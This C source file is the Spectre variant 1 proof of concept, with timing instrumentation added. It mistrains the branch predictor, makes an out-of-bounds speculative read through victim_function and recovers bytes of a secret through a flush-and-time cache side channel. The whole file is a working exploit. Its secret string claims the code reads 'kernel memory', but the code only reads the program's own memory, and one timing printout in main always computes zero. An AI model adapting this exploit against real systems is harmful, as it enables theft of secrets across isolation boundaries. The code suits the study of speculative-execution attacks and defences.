#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/time.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

/********************************************************************
Victim code.
********************************************************************/


unsigned int array1_size = 16;
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t array2[256 * 512]; // = 131072 = 4096 * 32
char * secret = "This code uses the Spectre vulnerability to access kernel memory";
uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */

// Timing
long startTime;

void victim_function(size_t x) {
  if (x < array1_size) {
    temp &= array2[array1[x] * 512];
  }
}

/********************************************************************
Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD (120) /* assume cache hit if time <= threshold */

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
  static int results[256];
  int tries, i, j, k, mix_i, junk = 0;
  size_t training_x, x;
  register uint64_t time1, time2;
  volatile uint8_t * addr;

  // Timing
  struct timeval checkA, checkB, checkC, checkD;
  struct timeval check1, check2, check3, check4, check5;
  long total1_2=0, total2_3=0, total3_4=0, total4_5=0;

  gettimeofday(&checkA, NULL);
  for (i = 0; i < 256; i++)
    results[i] = 0;
  gettimeofday(&checkB, NULL);
  for (tries = 999; tries > 0; tries--) {
    /* Flush array2[256*(0..255)] from cache */
    gettimeofday(&check1, NULL);
    for (i = 0; i < 256; i++)
      _mm_clflush( & array2[i * 512]); /* intrinsic for clflush instruction */
    gettimeofday(&check2, NULL);
    /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
    training_x = tries % array1_size; // allowed x within array1
    for (j = 29; j >= 0; j--) {
      _mm_clflush( & array1_size);
      for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */

      /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
      /* Avoid jumps in case those tip off the branch predictor */
      x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
      x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
      x = training_x ^ (x & (malicious_x ^ training_x));

      /* Call the victim! */
      victim_function(x);

    }
    gettimeofday(&check3, NULL);

    /* Time reads. Order is lightly mixed up to prevent stride prediction */
    for (i = 0; i < 256; i++) {
      mix_i = ((i * 167) + 13) & 255;
      addr = & array2[mix_i * 512];
      time1 = __rdtscp( & junk); /* READ TIMER */
      junk = * addr; /* MEMORY ACCESS TO TIME */
      time2 = __rdtscp( & junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
      if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
        results[mix_i]++; /* cache hit - add +1 to score for this value */
    }
    gettimeofday(&check4, NULL);

    /* Locate highest & second-highest results results tallies in j/k */
    j = k = -1;
    for (i = 0; i < 256; i++) {
      if (j < 0 || results[i] >= results[j]) {
        k = j;
        j = i;
      } else if (k < 0 || results[i] >= results[k]) {
        k = i;
      }
    }

    if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
      break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */

    gettimeofday(&check5, NULL);

    total1_2 += ((check2.tv_sec * (int)1e6 + check2.tv_usec)-((check1.tv_sec * (int)1e6 + check1.tv_usec)));
    total2_3 += ((check3.tv_sec * (int)1e6 + check3.tv_usec)-((check2.tv_sec * (int)1e6 + check2.tv_usec)));
    total3_4 += ((check4.tv_sec * (int)1e6 + check4.tv_usec)-((check3.tv_sec * (int)1e6 + check3.tv_usec)));
    total4_5 += ((check5.tv_sec * (int)1e6 + check5.tv_usec)-((check4.tv_sec * (int)1e6 + check4.tv_usec)));
  }
  gettimeofday(&checkC, NULL);
  results[0] ^= junk; /* use junk so code above won’t get optimized out*/
  value[0] = (uint8_t) j;
  score[0] = results[j];
  value[1] = (uint8_t) k;
  score[1] = results[k];
  gettimeofday(&checkD, NULL);


  printf("**RMB**\n");
  printf("CHECK A-B: %ld\n", ((checkB.tv_sec * (int)1e6 + checkB.tv_usec))-((checkA.tv_sec * (int)1e6 + checkA.tv_usec)));
  printf("CHECK B-C: %ld\n", ((checkC.tv_sec * (int)1e6 + checkC.tv_usec))-((checkB.tv_sec * (int)1e6 + checkB.tv_usec)));

  printf("CHECK 1-2 Average: %ld\n", total1_2/999);
  printf("CHECK 2-3 Average: %ld\n", total2_3/999);
  printf("CHECK 3-4 Average: %ld\n", total3_4/999);
  printf("CHECK 4-5 Average: %ld\n", total4_5/999);

  printf("CHECK C-D: %ld\n", ((checkD.tv_sec * (int)1e6 + checkD.tv_usec))-((checkC.tv_sec * (int)1e6 + checkC.tv_usec)));
}

int main(int argc,
  const char * * argv) {
  size_t malicious_x = (size_t)(secret - (char * ) array1); /* default for malicious_x */
  int i, score[2], len = 40;
  uint8_t value[2];

  struct timeval currentTime, check1, check2, check3;
  gettimeofday(&currentTime, NULL);
  startTime = currentTime.tv_sec * (int)1e6 + currentTime.tv_usec;

  for (i = 0; i < sizeof(array2); i++)
    array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */

  while (--len >= 0) {
    gettimeofday(&check1, NULL);
    readMemoryByte(malicious_x++, value, score);
    gettimeofday(&check2, NULL);
   // printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
    printf("0x%02X='%c' score=%d ", value[0],
      (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
    if (score[1] > 0)
      printf("(second best: 0x%02X score=%d)", value[1], score[1]);
    printf("\n");
    gettimeofday(&check3, NULL);
    printf("**MAIN**\n");
    printf("CHECK 1-2: %ld\n", ((check2.tv_sec * (int)1e6 + check2.tv_usec))-((check1.tv_sec * (int)1e6 + check1.tv_usec)));
    printf("CHECK 2-3: %ld\n", ((check2.tv_sec * (int)1e6 + check2.tv_usec))-((check2.tv_sec * (int)1e6 + check2.tv_usec)));
  }
  return (0);
}
